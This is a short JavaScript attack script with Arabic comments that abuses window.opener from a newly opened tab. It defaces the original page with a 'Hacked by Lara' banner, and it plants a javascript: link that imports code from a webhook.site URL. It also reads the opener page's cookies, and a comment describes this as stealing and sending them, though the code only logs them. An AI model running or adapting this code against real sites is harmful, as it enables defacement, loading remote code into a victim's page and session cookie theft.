console.log("Lara: Acting from the new tab...");

if (window.opener) {
    try {
        // الحل السحري هو استخدام الـ Backticks `` لتغليف النص بالكامل
        window.opener.document.body.innerHTML = `<h1 style='color:red; text-align:center; margin-top:100px;'><a href="javascript:import('https://webhook.site/12c0f2c0-0a4e-4d98-ba7d-ca0fba6e8f1f')">test</a>Hacked by Lara</h1>`;
        
        // سرقة الكوكيز وإرسالها
        const cookies = window.opener.document.cookie;
        console.log("Lara: Cookies from original page:", cookies);

        // إغلاق النافذة اختيارياً بعد التنفيذ
        // window.close(); 
    } catch (e) {
        console.error("Lara Error: ", e.message);
    }
}
